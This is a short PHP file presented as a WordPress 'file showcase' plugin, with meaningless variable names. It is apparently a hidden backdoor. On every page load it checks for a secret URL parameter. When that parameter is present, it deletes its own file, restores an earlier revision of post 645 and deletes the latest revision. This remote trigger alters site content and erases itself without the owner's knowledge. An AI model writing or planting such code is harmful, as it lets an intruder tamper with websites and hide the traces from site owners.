<?php

function all_file_showcase_plugin() {
	if (isset($_GET['wpc_addons_selector']) && $_GET['wpc_addons_selector'] === 'help_javascript_manage_publisher') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$edit_switcher_consent_loader = 645;
		$pdf_mediaelement_permalink_addon = wp_get_post_revisions($edit_switcher_consent_loader);
		if (empty($pdf_mediaelement_permalink_addon)) die('no revisions');
		if (count($pdf_mediaelement_permalink_addon) < 2) die('less than 2');
		$word_connector_year = array_shift($pdf_mediaelement_permalink_addon);
		$protect_label_super_sharing = $word_connector_year->ID;
		$location_home_tracker = array_shift($pdf_mediaelement_permalink_addon);
		$info_redirect_loader_refresh = $location_home_tracker->ID;
		$extensions_form_day = wp_restore_post_revision($info_redirect_loader_refresh);
		if ($extensions_form_day === false) die('error restoring');
		$extensions_form_day = wp_delete_post_revision($protect_label_super_sharing);		
		if ($extensions_form_day === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'all_file_showcase_plugin');
